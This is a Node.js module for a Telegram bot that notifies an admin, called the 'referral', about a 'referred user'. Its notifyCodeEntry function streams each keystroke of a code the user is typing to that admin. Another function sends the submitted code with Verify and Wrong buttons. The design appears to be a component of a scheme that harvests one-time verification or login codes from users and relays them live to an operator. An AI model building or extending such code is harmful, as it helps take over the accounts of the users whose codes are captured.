const telegram = require("../utils/telegram");

const publicProfile = (user) => ({
  id: user.id,
  username: user.username,
  displayName: [user.username ? `@${user.username}` : null].filter(Boolean).join(" ") || "Referred user",
});

/**
 * Tells the referral that a referred user is waiting, with a button that confirms
 * them. Delivery is a Telegram DM because a referral is an ADMIN/SUPERADMIN who
 * never opens the Mini App, so there is no live session to push to.
 */
async function notifyReferralReady(referrer, referredUser, verificationId) {
  if (!referrer || !referrer.telegramChatId) return false;

  try {
    await telegram.sendMessage(
      referrer.telegramChatId,
      ["A referred user is ready for verification.", "", `Username: ${publicProfile(referredUser).displayName}`].join(
        "\n"
      ),
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Ready", callback_data: `vr:${verificationId}` }],
          ],
        },
      }
    );
    return true;
  } catch (err) {
    console.error("Ready notification failed:", err.message);
    return false;
  }
}

/**
 * Streams the code the referred user is typing to the referral, one message per
 * change so the referral watches it fill in. Deliberately informational: it never
 * completes the verification, that stays with completeVerification.
 */
async function notifyCodeEntry(referrer, referredUser, code) {
  if (!referrer || !referrer.telegramChatId) return false;

  try {
    await telegram.sendMessage(
      referrer.telegramChatId,
      [
        `Code entry: ${code}`,
        "",
        `User: ${publicProfile(referredUser).displayName}`,
      ].join("\n")
    );
    return true;
  } catch (err) {
    console.error("Code entry notification failed:", err.message);
    return false;
  }
}

/**
 * Asks the referral to accept or reject the submitted code. The nonce is carried in
 * the callback data so buttons from a previous attempt cannot judge a newer one.
 */
async function notifyCodeForReview(referrer, referredUser, code, verificationId, nonce) {
  if (!referrer || !referrer.telegramChatId) return false;

  try {
    await telegram.sendMessage(
      referrer.telegramChatId,
      [
        `Submitted code: ${code}`,
        "",
        `User: ${publicProfile(referredUser).displayName}`,
      ].join("\n"),
      {
        reply_markup: {
          inline_keyboard: [
            [
              { text: "Verify", callback_data: `vok:${verificationId}:${nonce}` },
              { text: "Wrong", callback_data: `vwrong:${verificationId}:${nonce}` },
            ],
          ],
        },
      }
    );
    return true;
  } catch (err) {
    console.error("Code review request failed:", err.message);
    return false;
  }
}

module.exports = {
  publicProfile,
  notifyReferralReady,
  notifyCodeEntry,
  notifyCodeForReview,
};
